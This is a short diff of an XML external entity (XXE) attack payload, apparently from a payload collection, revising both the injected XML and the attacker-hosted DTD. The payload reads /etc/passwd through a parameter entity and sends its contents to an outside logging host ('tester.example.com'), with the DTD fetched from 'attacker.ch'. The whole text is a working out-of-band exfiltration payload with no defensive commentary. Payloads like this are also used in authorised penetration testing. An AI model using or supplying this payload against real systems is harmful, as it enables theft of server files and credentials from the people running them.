@@ -1,8 +1,16 @@
 //Injected XML (XML Parser)
 <?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [ <!ENTITY % pe SYSTEM "http://tester.example.com/xxe_file"> %pe; %param1; ]>
+<!DOCTYPE foo [ 
+    <!ENTITY % ext SYSTEM "http://attacker.ch/send.dtd"> 
+    %ext; 
+]>
 <foo>&external;</foo>
 
-// Attacker-Server
+// Attacker-Server - content of: "attacker.ch/send.dtd"
 <!ENTITY % payload SYSTEM "file:///etc/passwd">
-<!ENTITY % param1 "<!ENTITY external SYSTEM 'http://tester.example.com/log_xxe?data=%payload;'>">
+
+<!ENTITY % all "
+    <!ENTITY external SYSTEM 'http://tester.example.com/log-request?data=%payload;'>
+">
+
+%all;
